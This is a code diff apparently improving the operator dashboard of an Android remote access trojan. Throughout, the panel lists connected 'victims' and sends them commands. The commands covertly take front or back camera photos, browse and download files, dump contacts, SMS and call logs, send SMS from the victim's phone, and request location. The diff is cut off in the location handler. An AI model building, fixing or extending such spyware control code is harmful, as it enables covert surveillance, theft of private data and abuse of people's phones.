@@ -1,39 +1,86 @@
 const socket = io();
 
 let selectedVictimId = null;
+let currentImageData = null;
 const victimsList = document.getElementById('victims');
 
-// Function to show toast messages
-function showToast(message) {
+// Toast Message Function
+function showToast(message, type = 'info') {
     const toast = document.getElementById("toast-message");
     toast.textContent = message;
+    
+    // Set color based on type
+    switch(type) {
+        case 'success':
+            toast.style.background = 'linear-gradient(135deg, #00ff88, #00cc66)';
+            break;
+        case 'error':
+            toast.style.background = 'linear-gradient(135deg, #ff4444, #cc0000)';
+            break;
+        case 'warning':
+            toast.style.background = 'linear-gradient(135deg, #ffaa00, #ff8800)';
+            break;
+        default:
+            toast.style.background = 'linear-gradient(135deg, #00b7ff, #0088ff)';
+    }
+    
     toast.className = "show";
-    setTimeout(function(){ toast.className = toast.className.replace("show", ""); }, 3000);
+    setTimeout(() => {
+        toast.className = toast.className.replace("show", "");
+    }, 3000);
 }
 
+// Clear output area
+function clearOutput(outputAreaId) {
+    const outputArea = document.getElementById(outputAreaId);
+    if (outputArea) {
+        outputArea.innerHTML = '';
+    }
+}
+
+// Ensure victim is selected
+function ensureVictimSelected() {
+    if (!selectedVictimId) {
+        showToast('⚠️ Please select a victim first!', 'warning');
+        return false;
+    }
+    return true;
+}
+
+// Socket Events
 socket.on('connect', () => {
-    console.log('Connected to server as admin');
+    console.log('✅ Connected to server as admin');
     socket.emit('adminJoin');
-    showToast('Connected to server');
+    showToast('✅ Connected to server', 'success');
 });
 
 socket.on('disconnect', () => {
-    console.log('Disconnected from server');
-    showToast('Disconnected from server');
+    console.log('❌ Disconnected from server');
+    showToast('❌ Disconnected from server', 'error');
 });
 
+// Handle new victim connection
 socket.on('join', (device) => {
-    console.log('Victim joined:', device);
+    console.log('👤 Victim joined:', device);
+    
+    // Check if device already in list
+    const existingItem = document.getElementById(`victim-${device.id}`);
+    if (existingItem) {
+        existingItem.querySelector('span').textContent = 
+            `${device.model} (${device.id}) - Android ${device.android} - 📱 ${device.sim || 'No SIM'} - 🔋 ${Math.round(device.battery)}%`;
+        showToast(`🔄 ${device.model} reconnected`, 'warning');
+        return;
+    }
+    
     const listItem = document.createElement('li');
     listItem.id = `victim-${device.id}`;
     listItem.innerHTML = `
-        <span>${device.model} (${device.id}) - Android ${device.android}</span>
+        <span>${device.model} (${device.id}) - Android ${device.android} - 📱 ${device.sim || 'No SIM'} - 🔋 ${Math.round(device.battery)}%</span>
         <button data-id="${device.id}" class="select-victim-btn">Select</button>
     `;
     victimsList.appendChild(listItem);
 
     listItem.querySelector('.select-victim-btn').addEventListener('click', (e) => {
-        // Remove 'selected' class from previous selection
         const currentSelected = document.querySelector('.selected-victim');
         if (currentSelected) {
             currentSelected.classList.remove('selected-victim');
@@ -42,92 +89,99 @@ socket.on('join', (device) => {
 
         selectedVictimId = e.target.dataset.id;
         e.target.parentElement.classList.add('selected-victim');
-        e.target.textContent = 'Selected';
-        console.log('Selected victim:', selectedVictimId);
-        showToast(`Selected victim: ${device.model}`);
+        e.target.textContent = '✅ Selected';
+        console.log('🎯 Selected victim:', selectedVictimId);
+        showToast(`🎯 Selected: ${device.model}`, 'success');
     });
 });
 
 socket.on('disconnectClient', (socketId) => {
-    // Note: The server currently sends 'disconnectClient' with the socket.id, not device.id.
-    // We need to modify the server to send device.id or adjust this logic to match the server's output.
-    // For now, this part might not work as expected until server-side 'disconnectClient' is aligned.
-    console.warn("disconnectClient received. Logic might need adjustment to match server's emitted data.");
-    
-    // Attempt to remove based on device ID if we can map socketId to deviceId
-    // For now, let's assume `device.id` is passed correctly if `socketId` was actually `device.id`
-    const victimListItem = document.getElementById(`victim-${socketId}`); // Assuming socketId here is actually deviceId for removal
+    console.log('❌ Victim disconnected:', socketId);
+    const victimListItem = document.getElementById(`victim-${socketId}`);
     if (victimListItem) {
         victimListItem.remove();
-        if (selectedVictimId === socketId) { // Assuming socketId here is actually deviceId
+        if (selectedVictimId === socketId) {
             selectedVictimId = null;
-            showToast('Selected victim disconnected');
+            showToast('⚠️ Selected victim disconnected', 'warning');
         }
     }
 });
 
-
-// Generic error handling from server
+// Error handling
 socket.on('error', (data) => {
-    console.error('Server error:', data.error);
-    showToast(`Error: ${data.error}`);
+    console.error('❌ Server error:', data.error);
+    showToast(`❌ Error: ${data.error}`, 'error');
 });
 
-// Placeholder for future feature integration
-// Function to ensure a victim is selected before sending a command
-function ensureVictimSelected() {
-    if (!selectedVictimId) {
-        showToast('Please select a victim first.');
-        return false;
-    }
-    return true;
-}
-
-
-// Torch Control Logic
+// ==================== TORCH CONTROL FIX ====================
 const torchControlBtn = document.getElementById('torch-control-btn');
 const torchControlDialog = document.getElementById('torchControlDialog');
 const torchOnBtn = document.getElementById('torch-on-btn');
 const torchOffBtn = document.getElementById('torch-off-btn');
 const torchVictimName = document.getElementById('torch-victim-name');
 
+// TORCH CONTROL BUTTON CLICK
 torchControlBtn.addEventListener('click', () => {
     if (!ensureVictimSelected()) return;
     const selectedVictimElement = document.querySelector(`#victim-${selectedVictimId} span`);
-    torchVictimName.textContent = selectedVictimElement ? selectedVictimElement.textContent.split('(')[0].trim() : 'Unknown';
+    torchVictimName.textContent = selectedVictimElement ? selectedVictimElement.textContent.split('(')[0].trim() : 'Unknown Device';
     torchControlDialog.style.display = 'flex';
 });
 
+// CLOSE DIALOG
 torchControlDialog.querySelector('.close-button').addEventListener('click', () => {
     torchControlDialog.style.display = 'none';
 });
 
+// CLICK OUTSIDE TO CLOSE
 window.addEventListener('click', (event) => {
     if (event.target === torchControlDialog) {
         torchControlDialog.style.display = 'none';
     }
 });
 
+// TORCH ON BUTTON - FIXED
 torchOnBtn.addEventListener('click', () => {
     if (!ensureVictimSelected()) return;
-    socket.emit('torchControlRequest', JSON.stringify({ to: selectedVictimId, action: 'turnOnTorch', data: {} }));
-    showToast('Sending turn ON torch command...');
+    
+    const requestData = {
+        to: selectedVictimId, 
+        action: 'turnOnTorch', 
+        data: {} 
+    };
+    
+    console.log('🔦 Sending torch ON:', requestData);
+    socket.emit('torchControlRequest', JSON.stringify(requestData));
+    showToast('🔦 Sending torch ON command...');
 });
 
+// TORCH OFF BUTTON - FIXED
 torchOffBtn.addEventListener('click', () => {
     if (!ensureVictimSelected()) return;
-    socket.emit('torchControlRequest', JSON.stringify({ to: selectedVictomId, action: 'turnOffTorch', data: {} }));
-    showToast('Sending turn OFF torch command...');
+    
+    const requestData = {
+        to: selectedVictimId, 
+        action: 'turnOffTorch', 
+        data: {} 
+    };
+    
+    console.log('🔦 Sending torch OFF:', requestData);
+    socket.emit('torchControlRequest', JSON.stringify(requestData));
+    showToast('🔦 Sending torch OFF command...');
 });
 
+// TORCH CONTROL RESPONSE
 socket.on('torchControlResult', (data) => {
-    console.log('Torch control result:', data);
-    showToast(`Torch control result: ${data.message}`);
-    // Optionally close dialog or update UI based on result
+    console.log('🔦 Torch control result:', data);
+    if (data.success) {
+        showToast(`✅ ${data.message}`, 'success');
+    } else {
+        showToast(`❌ ${data.message}`, 'error');
+    }
     torchControlDialog.style.display = 'none';
 });
 
-// Camera Capture Logic
+// ==================== CAMERA CAPTURE FIX ====================
 const cameraCaptureBtn = document.getElementById('camera-capture-btn');
 const cameraCaptureDialog = document.getElementById('cameraCaptureDialog');
 const frontCameraBtn = document.getElementById('front-camera-btn');
@@ -137,74 +191,136 @@ const cameraVictimName = document.getElementById('camera-victim-name');
 const imagePreviewDialog = document.getElementById('imagePreviewDialog');
 const capturedImage = document.getElementById('captured-image');
 const previewVictimName = document.getElementById('preview-victim-name');
+const downloadImageBtn = document.getElementById('download-image-btn');
+const closePreviewBtn = document.getElementById('close-preview-btn');
 
+// CAMERA CAPTURE BUTTON CLICK
 cameraCaptureBtn.addEventListener('click', () => {
     if (!ensureVictimSelected()) return;
-    const selectedVictimElement = document.querySelector(`#victim-${selectedVictomId} span`);
-    cameraVictimName.textContent = selectedVictimElement ? selectedVictomElement.textContent.split('(')[0].trim() : 'Unknown';
+    const selectedVictimElement = document.querySelector(`#victim-${selectedVictimId} span`);
+    cameraVictimName.textContent = selectedVictimElement ? selectedVictimElement.textContent.split('(')[0].trim() : 'Unknown Device';
     cameraCaptureDialog.style.display = 'flex';
 });
 
+// CLOSE CAMERA DIALOG
 cameraCaptureDialog.querySelector('.close-button').addEventListener('click', () => {
     cameraCaptureDialog.style.display = 'none';
 });
 
+// CLICK OUTSIDE TO CLOSE
 window.addEventListener('click', (event) => {
     if (event.target === cameraCaptureDialog) {
         cameraCaptureDialog.style.display = 'none';
     }
 });
 
+// FRONT CAMERA BUTTON - FIXED
 frontCameraBtn.addEventListener('click', () => {
     if (!ensureVictimSelected()) return;
-    socket.emit('cameraCaptureRequest', JSON.stringify({ to: selectedVictomId, action: 'takePicture', data: { frontCamera: true } }));
-    showToast('Sending front camera capture command...');
-    cameraCaptureDialog.style.display = 'none'; // Close selection dialog
+    
+    const requestData = {
+        to: selectedVictimId, 
+        action: 'takePicture', 
+        data: { frontCamera: true } 
+    };
+    
+    console.log('📸 Sending front camera request:', requestData);
+    socket.emit('cameraCaptureRequest', JSON.stringify(requestData));
+    showToast('📸 Taking picture with front camera...');
+    cameraCaptureDialog.style.display = 'none';
 });
 
+// BACK CAMERA BUTTON - FIXED
 backCameraBtn.addEventListener('click', () => {
     if (!ensureVictimSelected()) return;
-    socket.emit('cameraCaptureRequest', JSON.stringify({ to: selectedVictomId, action: 'takePicture', data: { frontCamera: false } }));
-    showToast('Sending back camera capture command...');
-    cameraCaptureDialog.style.display = 'none'; // Close selection dialog
+    
+    const requestData = {
+        to: selectedVictimId, 
+        action: 'takePicture', 
+        data: { frontCamera: false } 
+    };
+    
+    console.log('📸 Sending back camera request:', requestData);
+    socket.emit('cameraCaptureRequest', JSON.stringify(requestData));
+    showToast('📸 Taking picture with back camera...');
+    cameraCaptureDialog.style.display = 'none';
 });
 
-// Image preview dialog close
+// IMAGE PREVIEW DIALOG CLOSE
 imagePreviewDialog.querySelector('.close-button').addEventListener('click', () => {
     imagePreviewDialog.style.display = 'none';
-    capturedImage.src = ''; // Clear image
+    capturedImage.src = '';
+    currentImageData = null;
 });
 
+// CLOSE PREVIEW BUTTON
+closePreviewBtn.addEventListener('click', () => {
+    imagePreviewDialog.style.display = 'none';
+    capturedImage.src = '';
+    currentImageData = null;
+});
+
+// CLICK OUTSIDE TO CLOSE PREVIEW
 window.addEventListener('click', (event) => {
     if (event.target === imagePreviewDialog) {
         imagePreviewDialog.style.display = 'none';
-        capturedImage.src = ''; // Clear image
+        capturedImage.src = '';
+        currentImageData = null;
     }
 });
 
-
+// CAMERA CAPTURE RESPONSE
 socket.on('cameraCaptureResult', (data) => {
-    console.log('Camera capture result:', data);
-    if (data.success) {
-        const selectedVictimElement = document.querySelector(`#victim-${selectedVictomId} span`);
-        previewVictimName.textContent = selectedVictimElement ? selectedVictomElement.textContent.split('(')[0].trim() : 'Unknown';
-        capturedImage.src = data.image; // Base64 image data
+    console.log('📸 Camera capture result:', data);
+    if (data.success && data.image) {
+        const selectedVictimElement = document.querySelector(`#victim-${selectedVictimId} span`);
+        previewVictimName.textContent = selectedVictimElement ? selectedVictimElement.textContent.split('(')[0].trim() : 'Unknown Device';
+        
+        // Store image data for download
+        currentImageData = data.image;
+        
+        // Display image (add data URL prefix if needed)
+        let imageSrc = data.image;
+        if (!imageSrc.startsWith('data:image')) {
+            imageSrc = "data:image/jpeg;base64," + data.image;
+        }
+        capturedImage.src = imageSrc;
+        
         imagePreviewDialog.style.display = 'flex';
-        showToast('Image captured successfully!');
+        showToast('✅ Image captured successfully!', 'success');
     } else {
-        showToast(`Camera capture failed: ${data.message}`);
+        showToast(`❌ Camera capture failed: ${data.message || 'Unknown error'}`, 'error');
     }
 });
 
-// Function to clear output area content
-function clearOutput(outputAreaId) {
-    const outputArea = document.getElementById(outputAreaId);
-    if (outputArea) {
-        outputArea.innerHTML = '';
+// DOWNLOAD CAPTURED IMAGE
+downloadImageBtn.addEventListener('click', () => {
+    if (!currentImageData) {
+        showToast('❌ No image to download', 'error');
+        return;
     }
-}
+    
+    try {
+        let imageData = currentImageData;
+        if (!imageData.startsWith('data:image')) {
+            imageData = "data:image/jpeg;base64," + imageData;
+        }
+        
+        const link = document.createElement('a');
+        link.href = imageData;
+        link.download = `captured_image_${selectedVictimId}_${Date.now()}.jpg`;
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+        
+        showToast('✅ Image downloaded successfully!', 'success');
+    } catch (error) {
+        console.error('Download error:', error);
+        showToast('❌ Failed to download image', 'error');
+    }
+});
 
-// File Management Logic
+// ==================== FILE MANAGEMENT ====================
 const getDirBtn = document.getElementById('get-dir-btn');
 const dirPathInput = document.getElementById('dir-path-input');
 const dirListingOutput = document.getElementById('dir-listing-output');
@@ -215,113 +331,221 @@ const imagePathInput = document.getElementById('image-path-input');
 
 getDirBtn.addEventListener('click', () => {
     if (!ensureVictimSelected()) return;
-    const path = dirPathInput.value || '/'; // Default to root if no path entered
+    const path = dirPathInput.value.trim() || '/';
     clearOutput('dir-listing-output');
-    socket.emit('getDirRequest', JSON.stringify({ to: selectedVictimId, action: 'getDir', data: path }));
-    showToast(`Requesting directory listing for: ${path}`);
+    
+    const requestData = {
+        to: selectedVictimId, 
+        action: 'getDir', 
+        data: path 
+    };
+    
+    console.log('📁 Sending directory request:', requestData);
+    socket.emit('getDirRequest', JSON.stringify(requestData));
+    showToast(`📂 Requesting directory: ${path}`);
 });
 
 socket.on('getDir', (data) => {
-    console.log('Directory Listing:', data);
+    console.log('📁 Directory Listing:', data);
     clearOutput('dir-listing-output');
-    if (data && data.length > 0) {
-        let html = '<h4>Directory Listing:</h4><ul>';
-        data.forEach(item => {
-            html += `<li>${item.isDirectory ? '[DIR]' : '[FILE]'} ${item.name} (${item.size ? (item.size / 1024).toFixed(2) + ' KB' : (item.items ? item.items + ' items' : '')})</li>`;
+    
+    if (Array.isArray(data) && data.length > 0) {
+        let html = '<h4>📁 Directory Contents:</h4><ul>';
+        
+        // Sort: directories first, then files
+        const sortedData = data.sort((a, b) => {
+            if (a.isDirectory && !b.isDirectory) return -1;
+            if (!a.isDirectory && b.isDirectory) return 1;
+            return a.name.localeCompare(b.name);
+        });
+        
+        sortedData.forEach(item => {
+            const icon = item.isDirectory ? '📁' : item.isImage ? '🖼️' : '📄';
+            let sizeInfo = '';
+            
+            if (item.isDirectory) {
+                sizeInfo = `<span class="size">${item.items || 0} items</span>`;
+            } else {
+                const sizeKB = (item.size / 1024).toFixed(2);
+                sizeInfo = `<span class="size">${sizeKB} KB</span>`;
+            }
+            
+            html += `
+                <li>
+                    ${icon} <strong>${item.name}</strong>
+                    <div class="file-info">
+                        ${sizeInfo}
+                        ${item.isDirectory ? '<span class="type">Directory</span>' : '<span class="type">File</span>'}
+                    </div>
+                </li>
+            `;
         });
         html += '</ul>';
         dirListingOutput.innerHTML = html;
-        showToast('Directory listing received.');
+        showToast('✅ Directory listing received', 'success');
     } else {
-        dirListingOutput.innerHTML = '<p>No items found or directory is empty.</p>';
-        showToast('No directory listing received.');
+        dirListingOutput.innerHTML = '<p>📭 Directory is empty or not found.</p>';
+        showToast('📭 No files found in directory', 'warning');
     }
 });
 
 downloadFileBtn.addEventListener('click', () => {
     if (!ensureVictimSelected()) return;
-    const path = filePathInput.value;
+    const path = filePathInput.value.trim();
     if (!path) {
-        showToast('Please enter a file path to download.');
+        showToast('⚠️ Please enter a file path', 'warning');
         return;
     }
-    socket.emit('downloadRequest', JSON.stringify({ to: selectedVictimId, action: 'download', data: path }));
-    showToast(`Requesting download for: ${path}`);
+    
+    const requestData = {
+        to: selectedVictimId, 
+        action: 'download', 
+        data: path 
+    };
+    
+    console.log('⬇️ Sending download request:', requestData);
+    socket.emit('downloadRequest', JSON.stringify(requestData));
+    showToast(`⬇️ Requesting file: ${path}`);
 });
 
 socket.on('download', (data) => {
-    console.log('Download received:', data);
+    console.log('📥 Download received:', data);
+    
     if (data.fileData && data.fileName) {
-        const link = document.createElement('a');
-        link.href = 'data:application/octet-stream;base64,' + btoa(String.fromCharCode.apply(null, new Uint8Array(data.fileData)));
-        link.download = data.fileName;
-        document.body.appendChild(link);
-        link.click();
-        document.body.removeChild(link);
-        showToast(`File "${data.fileName}" downloaded.`);
+        try {
+            // Convert base64 to blob
+            const byteCharacters = atob(data.fileData);
+            const byteNumbers = new Array(byteCharacters.length);
+            for (let i = 0; i < byteCharacters.length; i++) {
+                byteNumbers[i] = byteCharacters.charCodeAt(i);
+            }
+            const byteArray = new Uint8Array(byteNumbers);
+            
+            // Determine MIME type
+            let mimeType = 'application/octet-stream';
+            const ext = data.fileName.split('.').pop().toLowerCase();
+            const mimeTypes = {
+                'jpg': 'image/jpeg',
+                'jpeg': 'image/jpeg',
+                'png': 'image/png',
+                'gif': 'image/gif',
+                'pdf': 'application/pdf',
+                'txt': 'text/plain',
+                'mp3': 'audio/mpeg',
+                'mp4': 'video/mp4'
+            };
+            
+            if (mimeTypes[ext]) {
+                mimeType = mimeTypes[ext];
+            }
+            
+            const blob = new Blob([byteArray], {type: mimeType});
+            const url = URL.createObjectURL(blob);
+            const link = document.createElement('a');
+            link.href = url;
+            link.download = data.fileName;
+            link.style.display = 'none';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            URL.revokeObjectURL(url);
+            
+            showToast(`✅ File "${data.fileName}" downloaded`, 'success');
+        } catch (error) {
+            console.error('Download error:', error);
+            showToast('❌ Failed to process download', 'error');
+        }
     } else {
-        showToast('Failed to download file or no file data received.');
+        showToast('❌ No file data received', 'error');
     }
 });
 
 previewImageBtn.addEventListener('click', () => {
     if (!ensureVictimSelected()) return;
-    const path = imagePathInput.value;
+    const path = imagePathInput.value.trim();
     if (!path) {
-        showToast('Please enter an image path to preview.');
+        showToast('⚠️ Please enter an image path', 'warning');
         return;
     }
-    socket.emit('previewImageRequest', JSON.stringify({ to: selectedVictimId, action: 'previewImage', data: path }));
-    showToast(`Requesting image preview for: ${path}`);
+    
+    const requestData = {
+        to: selectedVictimId, 
+        action: 'previewImage', 
+        data: path 
+    };
+    
+    console.log('🖼️ Sending image preview request:', requestData);
+    socket.emit('previewImageRequest', JSON.stringify(requestData));
+    showToast(`🖼️ Requesting image: ${path}`);
 });
 
-// `previewImage` response is already handled by the imagePreviewDialog in camera capture logic.
-// We just need to ensure the correct action is triggered and the image data is compatible.
 socket.on('previewImage', (data) => {
-    console.log('Image preview received:', data);
-    if (data.image) {
-        // Reuse image preview dialog
+    console.log('🖼️ Image preview received:', data);
+    
+    if (data && data.image) {
         const selectedVictimElement = document.querySelector(`#victim-${selectedVictimId} span`);
-        previewVictimName.textContent = selectedVictimElement ? selectedVictimElement.textContent.split('(')[0].trim() : 'Unknown';
-        capturedImage.src = data.image; // Base64 image data
+        previewVictimName.textContent = selectedVictimElement ? selectedVictimElement.textContent.split('(')[0].trim() : 'Unknown Device';
+        
+        currentImageData = data.image;
+        let imageSrc = data.image;
+        if (!imageSrc.startsWith('data:image')) {
+            imageSrc = "data:image/jpeg;base64," + data.image;
+        }
+        capturedImage.src = imageSrc;
+        
         imagePreviewDialog.style.display = 'flex';
-        showToast('Image preview received.');
+        showToast('✅ Image preview loaded', 'success');
     } else {
-        showToast('Failed to get image preview or no image data received.');
+        showToast('❌ Failed to load image preview', 'error');
     }
 });
 
-
-// App Information Logic
+// ==================== APP INFORMATION ====================
 const getInstalledAppsBtn = document.getElementById('get-installed-apps-btn');
 const installedAppsOutput = document.getElementById('installed-apps-output');
 
 getInstalledAppsBtn.addEventListener('click', () => {
     if (!ensureVictimSelected()) return;
     clearOutput('installed-apps-output');
-    socket.emit('getInstalledAppsRequest', JSON.stringify({ to: selectedVictimId, action: 'getInstalledApps', data: {} }));
-    showToast('Requesting installed apps list...');
+    
+    const requestData = {
+        to: selectedVictimId, 
+        action: 'getInstalledApps', 
+        data: {} 
+    };
+    
+    console.log('📱 Sending installed apps request:', requestData);
+    socket.emit('getInstalledAppsRequest', JSON.stringify(requestData));
+    showToast('📱 Requesting installed apps...');
 });
 
 socket.on('getInstalledApps', (data) => {
-    console.log('Installed Apps:', data);
+    console.log('📱 Installed Apps:', data);
     clearOutput('installed-apps-output');
+    
     if (data && data.installedApps && data.installedApps.length > 0) {
-        let html = '<h4>Installed Applications:</h4><ul>';
+        let html = '<h4>📱 Installed Applications:</h4><ul>';
+        
         data.installedApps.forEach(app => {
-            html += `<li><strong>${app.appName}</strong> (${app.packageName})</li>`;
+            html += `
+                <li>
+                    <strong>${app.appName}</strong>
+                    <div class="app-info">
+                        <span class="package">${app.packageName}</span>
+                    </div>
+                </li>
+            `;
         });
         html += '</ul>';
         installedAppsOutput.innerHTML = html;
-        showToast('Installed apps list received.');
+        showToast(`✅ Found ${data.installedApps.length} apps`, 'success');
     } else {
-        installedAppsOutput.innerHTML = '<p>No installed applications found.</p>';
-        showToast('No installed apps list received.');
+        installedAppsOutput.innerHTML = '<p>📭 No installed applications found.</p>';
+        showToast('📭 No apps found', 'warning');
     }
 });
 
-
-// Contacts, SMS & Calls Logic
+// ==================== CONTACTS, SMS & CALLS ====================
 const getContactsBtn = document.getElementById('get-contacts-btn');
 const contactsOutput = document.getElementById('contacts-output');
 const getSmsBtn = document.getElementById('get-sms-btn');
@@ -335,168 +559,515 @@ const smsMessageInput = document.getElementById('sms-message-input');
 getContactsBtn.addEventListener('click', () => {
     if (!ensureVictimSelected()) return;
     clearOutput('contacts-output');
-    socket.emit('getContactsRequest', JSON.stringify({ to: selectedVictimId, action: 'getContacts', data: {} }));
-    showToast('Requesting contacts...');
+    
+    const requestData = {
+        to: selectedVictimId, 
+        action: 'getContacts', 
+        data: {} 
+    };
+    
+    console.log('👥 Sending contacts request:', requestData);
+    socket.emit('getContactsRequest', JSON.stringify(requestData));
+    showToast('👥 Requesting contacts...');
 });
 
 socket.on('getContacts', (data) => {
-    console.log('Contacts:', data);
+    console.log('👥 Contacts:', data);
     clearOutput('contacts-output');
+    
     if (data && data.contactsList && data.contactsList.length > 0) {
-        let html = '<h4>Contacts:</h4><ul>';
+        let html = `<h4>👥 Contacts (${data.contactsList.length}):</h4><ul>`;
+        
         data.contactsList.forEach(contact => {
-            html += `<li><strong>${contact.name}</strong>: ${contact.phoneNo}</li>`;
+            const name = contact.name || 'Unknown';
+            const phone = contact.phoneNo || 'No number';
+            html += `
+                <li>
+                    <strong>${name}</strong>
+                    <div class="contact-info">
+                        <span class="phone">${phone}</span>
+                    </div>
+                </li>
+            `;
         });
         html += '</ul>';
         contactsOutput.innerHTML = html;
-        showToast('Contacts received.');
+        showToast(`✅ Found ${data.contactsList.length} contacts`, 'success');
     } else {
-        contactsOutput.innerHTML = '<p>No contacts found.</p>';
-        showToast('No contacts received.');
+        contactsOutput.innerHTML = '<p>📭 No contacts found.</p>';
+        showToast('📭 No contacts found', 'warning');
     }
 });
 
 getSmsBtn.addEventListener('click', () => {
     if (!ensureVictimSelected()) return;
     clearOutput('sms-output');
-    // For simplicity, requesting first 50 SMS. Can add input fields for start/end if needed.
-    socket.emit('getSMSRequest', JSON.stringify({ to: selectedVictimId, action: 'getSMS', data: { start: 0, end: 50 } }));
-    showToast('Requesting SMS messages...');
+    
+    const requestData = {
+        to: selectedVictimId, 
+        action: 'getSMS', 
+        data: { start: 0, end: 100 } 
+    };
+    
+    console.log('💬 Sending SMS request:', requestData);
+    socket.emit('getSMSRequest', JSON.stringify(requestData));
+    showToast('💬 Requesting SMS messages...');
 });
 
 socket.on('getSMS', (data) => {
-    console.log('SMS Messages:', data);
+    console.log('💬 SMS Messages:', data);
     clearOutput('sms-output');
+    
     if (data && data.sms && data.sms.length > 0) {
-        let html = `<h4>SMS Messages (${data.totalSMS} total, showing first ${data.sms.length}):</h4><ul>`;
+        let html = `<h4>💬 SMS Messages (${data.totalSMS} total):</h4><ul>`;
+        
         data.sms.forEach(msg => {
-            html += `<li><strong>From: ${msg.number}</strong> (${new Date(msg.date).toLocaleString()})<p>${msg.body}</p></li>`;
+            const date = new Date(msg.date);
+            const formattedDate = date.toLocaleString();
+            const shortBody = msg.body.length > 100 ? msg.body.substring(0, 100) + '...' : msg.body;
+            
+            html += `
+                <li>
+                    <div class="sms-header">
+                        <strong>${msg.number || 'Unknown'}</strong>
+                        <span class="sms-date">${formattedDate}</span>
+                    </div>
+                    <div class="sms-body">${shortBody}</div>
+                </li>
+            `;
         });
         html += '</ul>';
         smsOutput.innerHTML = html;
-        showToast('SMS messages received.');
+        showToast(`✅ Found ${data.sms.length} SMS messages`, 'success');
     } else {
-        smsOutput.innerHTML = '<p>No SMS messages found.</p>';
-        showToast('No SMS messages received.');
+        smsOutput.innerHTML = '<p>📭 No SMS messages found.</p>';
+        showToast('📭 No SMS found', 'warning');
     }
 });
 
 getCallLogBtn.addEventListener('click', () => {
     if (!ensureVictimSelected()) return;
     clearOutput('call-log-output');
-    socket.emit('getCallLogRequest', JSON.stringify({ to: selectedVictimId, action: 'getCallLog', data: {} }));
-    showToast('Requesting call log...');
+    
+    const requestData = {
+        to: selectedVictimId, 
+        action: 'getCallLog', 
+        data: {} 
+    };
+    
+    console.log('📞 Sending call log request:', requestData);
+    socket.emit('getCallLogRequest', JSON.stringify(requestData));
+    showToast('📞 Requesting call log...');
 });
 
 socket.on('getCallLog', (data) => {
-    console.log('Call Log:', data);
+    console.log('📞 Call Log:', data);
     clearOutput('call-log-output');
+    
     if (data && data.callsLog && data.callsLog.length > 0) {
-        let html = '<h4>Call Log:</h4><ul>';
+        let html = `<h4>📞 Recent Calls (${data.callsLog.length}):</h4><ul>`;
+        
         data.callsLog.forEach(call => {
             let type = '';
-            // Assuming type 1 = incoming, 2 = outgoing, 3 = missed (Android standard)
-            if (call.type == 1) type = 'Incoming';
-            else if (call.type == 2) type = 'Outgoing';
-            else if (call.type == 3) type = 'Missed';
-            else type = 'Unknown';
-
-            html += `<li><strong>${type}</strong> - ${call.name || call.phoneNo} (Duration: ${call.duration}s)</li>`;
+            let typeIcon = '';
+            let typeClass = '';
+            
+            switch(call.type) {
+                case 1:
+                    type = 'Incoming';
+                    typeIcon = '📥';
+                    typeClass = 'incoming';
+                    break;
+                case 2:
+                    type = 'Outgoing';
+                    typeIcon = '📤';
+                    typeClass = 'outgoing';
+                    break;
+                case 3:
+                    type = 'Missed';
+                    typeIcon = '❌';
+                    typeClass = 'missed';
+                    break;
+                default:
+                    type = 'Unknown';
+                    typeIcon = '❓';
+                    typeClass = 'unknown';
+            }
+            
+            const name = call.name || call.phoneNo || 'Unknown';
+            const duration = call.duration ? `${call.duration}s` : 'N/A';
+            
+            html += `
+                <li class="call-type-${typeClass}">
+                    <div class="call-header">
+                        <strong>${typeIcon} ${name}</strong>
+                        <span class="call-duration">${duration}</span>
+                    </div>
+                    <div class="call-info">
+                        <span class="call-type">${type}</span>
+                        <span class="call-number">${call.phoneNo || 'N/A'}</span>
+                    </div>
+                </li>
+            `;
         });
         html += '</ul>';
         callLogOutput.innerHTML = html;
-        showToast('Call log received.');
+        showToast(`✅ Found ${data.callsLog.length} call records`, 'success');
     } else {
-        callLogOutput.innerHTML = '<p>No call log entries found.</p>';
-        showToast('No call log received.');
+        callLogOutput.innerHTML = '<p>📭 No call log entries found.</p>';
+        showToast('📭 No call log found', 'warning');
     }
 });
 
 sendSmsBtn.addEventListener('click', () => {
     if (!ensureVictimSelected()) return;
-    const number = smsNumberInput.value;
-    const message = smsMessageInput.value;
-    if (!number || !message) {
-        showToast('Please enter both number and message for SMS.');
+    
+    const number = smsNumberInput.value.trim();
+    const message = smsMessageInput.value.trim();
+    
+    if (!number) {
+        showToast('⚠️ Please enter phone number', 'warning');
         return;
     }
-    socket.emit('sendSMSRequest', JSON.stringify({ to: selectedVictimId, action: 'sendSMS', data: { mobile_no: number, msg: message } }));
-    showToast(`Sending SMS to ${number}...`);
+    if (!message) {
+        showToast('⚠️ Please enter message', 'warning');
+        return;
+    }
+    
+    const requestData = {
+        to: selectedVictimId, 
+        action: 'sendSMS', 
+        data: { mobile_no: number, msg: message } 
+    };
+    
+    console.log('📤 Sending SMS request:', requestData);
+    socket.emit('sendSMSRequest', JSON.stringify(requestData));
+    
+    showToast(`📤 Sending SMS to ${number}...`);
+    smsNumberInput.value = '';
+    smsMessageInput.value = '';
 });
 
 socket.on('sendSMS', (data) => {
-    console.log('Send SMS Result:', data);
-    if (data === "success") { // Server sends "success" string for successful SMS
-        showToast('SMS sent successfully!');
-    } else if (data && data.error) { // Server sends {error: "..."} for failed SMS
-        showToast(`Failed to send SMS: ${data.error}`);
+    console.log('📤 Send SMS Result:', data);
+    
+    if (data === "success") {
+        showToast('✅ SMS sent successfully!', 'success');
+    } else if (data && data.error) {
+        showToast(`❌ SMS failed: ${data.error}`, 'error');
     } else {
-        showToast('SMS operation completed with unknown status.');
+        showToast('⚠️ SMS operation completed', 'warning');
     }
 });
 
-
-// Location Logic
+// ==================== LOCATION ====================
 const getLocationBtn = document.getElementById('get-location-btn');
 const locationOutput = document.getElementById('location-output');
 
 getLocationBtn.addEventListener('click', () => {
     if (!ensureVictimSelected()) return;
     clearOutput('location-output');
-    socket.emit('getLocationRequest', JSON.stringify({ to: selectedVictimId, action: 'getLocation', data: {} }));
-    showToast('Requesting location...');
+    
+    const requestData = {
+        to: selectedVictimId, 
+        action: 'getLocation', 
+        data: {} 
+    };
+    
+    console.log('📍 Sending location request:', requestData);
+    socket.emit('getLocationRequest', JSON.stringify(requestData));
+    showToast('📍 Requesting location...');
 });
 
 socket.on('getLocation', (data) => {
-    console.log('Location:', data);
+    console.log('📍 Location:', data);
     clearOutput('location-output');
+    
     if (data && data.lat && data.long) {
